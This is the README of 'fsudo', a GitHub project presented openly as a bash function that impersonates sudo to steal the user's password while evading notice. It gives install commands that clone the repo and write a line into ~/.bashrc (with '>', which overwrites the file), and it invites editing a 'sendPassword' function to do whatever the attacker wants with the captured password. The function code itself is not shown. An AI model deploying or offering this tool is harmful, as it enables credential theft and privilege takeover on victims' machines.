# fsudo
It's just a bash function to steal the users password, while trying to be stealth handling scenarios like the user asking for the sudo help or the user giving the wrong password among other scenarios.

# Install
```bash
git clone https://github.com/mthbernardes/fsudo.git
cd fsudo
echo "source `pwd`/fakesudo.sh" > /home/$USER/.bashrc
```

# Get the password
Just edit the function `sendPassword` to do whatever you want with the password.
